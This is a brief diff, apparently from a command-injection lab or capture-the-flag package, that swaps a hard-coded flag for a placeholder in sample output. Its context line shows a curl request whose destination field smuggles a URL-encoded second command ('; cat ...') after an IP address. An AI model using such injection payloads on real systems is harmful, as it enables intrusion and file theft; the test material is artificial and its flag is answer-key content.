@@ -63,7 +63,7 @@ $ curl "cmd_injection_env:8080/network?destination=123.123.123.123%3B%20cat%20%2
 
 --- 123.123.123.123 ping statistics ---
 1 packets transmitted, 0 packets received, 100% packet loss
-avLqauOEBxvpDKI2
+REPLACE_ME_WITH_RANDOM_FLAG_0
 </code>
 </body>
 </html>
